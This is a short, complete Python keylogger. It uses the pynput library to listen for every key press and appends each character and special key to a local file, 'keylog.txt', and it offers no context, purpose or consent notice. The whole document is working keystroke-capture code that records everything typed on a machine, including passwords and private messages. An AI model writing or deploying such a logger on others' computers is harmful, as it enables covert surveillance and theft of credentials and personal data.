from pynput import keyboard

# File to save the logged keys
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            # Log alphanumeric keys
            file.write(key.char)
    except AttributeError:
        # Log special keys (e.g., space, enter, shift)
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

def main():
    # Listener for keyboard events
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
